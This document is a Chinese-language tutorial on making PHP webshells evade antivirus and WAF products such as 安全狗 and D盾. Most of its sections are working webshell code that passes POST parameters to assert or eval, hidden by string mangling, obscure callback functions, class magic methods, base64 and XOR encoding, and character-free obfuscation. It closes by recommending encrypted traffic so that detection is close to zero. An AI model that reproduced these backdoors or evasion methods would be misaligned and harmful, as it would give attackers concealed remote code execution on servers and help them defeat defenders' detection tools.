# 0x01 前言
尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧

# 0x02 目录
0. 关于eval 于 assert
1. 字符串变形
2. 定义函数绕过
3. 回调函数
4. 回调函数变形
5. 特殊字符干扰
6. 数组
7. 类
8. 编码绕过
9. 无字符特征马
10. PHP7.1后webshell何去何从
11. 总结

# 0x03 关于eval 于 assert

关于eval函数在php给出的官方说明是
>eval 是一个语言构造器而不是一个函数，不能被 可变函数 调用
可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行
通俗的说比如你 `<?php $a=eval;$a() ?>` 这样是不行的 也造就了用eval的话达不到assert的灵活，但是在php7.1以上assert已经不行

关于assert函数
>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！

# 0x04 字符串变形
字符串变形多数用于BYPASS安全狗，相当对于D盾，安全狗更加重视"形"
一个特殊的变形就能绕过安全狗，看看PHP手册，有着很多关于操作字符串的函数

```
ucwords() //函数把字符串中每个单词的首字符转换为大写。
ucfirst() //函数把字符串中的首字符转换为大写。
trim() //函数从字符串的两端删除空白字符和其他预定义字符。
substr_replace() //函数把字符串的一部分替换为另一个字符串
substr() //函数返回字符串的一部分。
strtr() //函数转换字符串中特定的字符。
strtoupper() //函数把字符串转换为大写。
strtolower() //函数把字符串转换为小写。
strtok() //函数把字符串分割为更小的字符串
str_rot13() //函数对字符串执行 ROT13 编码。

```

由于PHP的灵活性操作字符串的函数很多，我这里就不一一列举了

用`substr_replace()` 函数变形assert 达到免杀的效果

```
<?php

$a = substr_replace("assexx","rt",4);

$a($_POST['x']);

?>

```


其他函数类似 不一一列举了

# 0x05 定义函数绕过
定义一个函数把关键词分割达到bypass效果

```
<?php 
function kdog($a){
    $a($_POST['x']);
}
kdog(assert);
?>
```

反之

```
<?php 
function kdog($a){
    assert($a);
}
kdog($_POST[x]);
?>

```

效果一样，这种绕过方法，对安全狗还是比较有效的 在d盾面前就显得小儿科了 ，不过后面会讲到如何用定义函数的方法来 绕过d盾


# 0x05 回调函数

```
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```

回调函数大部分已经被安全软件加入全家桶套餐 所以找到一个生僻的不常用的回调函数来执行 比如

```
<?php 
forward_static_call_array(assert,array($_POST[x]));
?>
```

这个函数能过狗，但是D盾显示是一级


# 0x05 回调函数变形

前面说过众多回调函数已经被加入豪华套餐了，怎么绕过呢，其实也很简单 那就是定义个函数 或者类来调用

定义一个函数

```

<?php
function test($a,$b){
    array_map($a,$b);
}
test(assert,array($_POST['x']));
?> 

```

定义一个类

```
<?php
class loveme {
    var $a;
    var $b;
    function __construct($a,$b) {
        $this->a=$a;
        $this->b=$b;
    }
    function test() {
       array_map($this->a,$this->b);
    }
}
$p1=new loveme(assert,array($_POST['x']));
$p1->test();
?>
```

# 0x06 特殊字符干扰

特殊字符干扰，要求是能干扰到杀软的正则判断，还要代码能执行,网上广为流传的连接符

初代版本

```
<?php
$a = $_REQUEST['a'];
$b = null;
eval($b.$a);
?>
```

不过已经不能免杀了，利用适当的变形即可免杀 如

```
<?php
$a = $_POST['a'];
$b = "\n";
eval($b.=$a);
?>

```

其他方法大家尽情发挥如"\r\n\t",函数返回，类，等等

除了连接符号 还有个命名空间的东西 \ 具体大家可以看看php手册

```
<?php
function dog($a){
    \assert($a);
}
dog($_POST[x]);
?>

```


当然还有其他的符号熟读PHP手册就会有不一样的发现

# 0x07 数组

把执行代码放入数组中执行绕过

```
<?php
$a = substr_replace("assexx","rt",4);
$b=[''=>$a($_POST['q'])];
?>
```

多维数组

```
<?php
$b = substr_replace("assexx","rt",4);
$a = array($arrayName = array('a' => $b($_POST['q'])));
?>

```


# 0x08 类

说到类肯定要搭配上魔术方法比如 `__destruct()`，`__construct()`
直接上代码

```
<?php 

class me
{
  public $a = '';
  function __destruct(){

    assert("$this->a");
  }
}

$b = new me;
$b->a = $_POST['x'];

?>
```

用类把函数包裹,D盾对类查杀较弱


# 0x09 编码绕过
用php的编码函数，或者用异或等等
简单的base64_decode,其中因为他的正则匹配可以加入一些下划线干扰杀软

```
<?php
$a = base64_decode("YXNz+ZX____J____0");
$a($_POST[x]);
?>
```

异或

```
<?php
$a= ("!"^"@").'ssert';
$a($_POST[x]);
?>
```

# 0x9 无字符特征马

对于无特征马这里我的意思是 无字符特征 

1. 利用异或,编码等方式 例如p神博客的

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);

```

2. 利用正则匹配字符 如Tab等  然后转换为字符


3. 利用POST包获取关键参数执行 例如

```
<?php
$decrpt = $_POST['x'];
$arrs = explode("|", $decrpt)[1];
$arrs = explode("|", base64_decode($arrs));
call_user_func($arrs[0],$arrs[1]);
?>

```




# 0x10 PHP7.1后webshell何去何从

在php7.1后面我们已经不能使用强大的assert函数了用eval将更加注重特殊的调用方法和一些字符干扰,后期大家可能更加倾向使用大马


# 总结

对于安全狗杀形，d盾杀参的思路来绕过。生僻的回调函数,特殊的加密方式,以及关键词的后传入都是不错的选择。
对于关键词的后传入对免杀安全狗，d盾，河马 等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化
用户可以对传出的post数据进行自定义脚本加密，再由webshell进行解密获取参数，那么以现在的软WAF查杀能力
几乎为0，安全软件也需要与时俱进了。
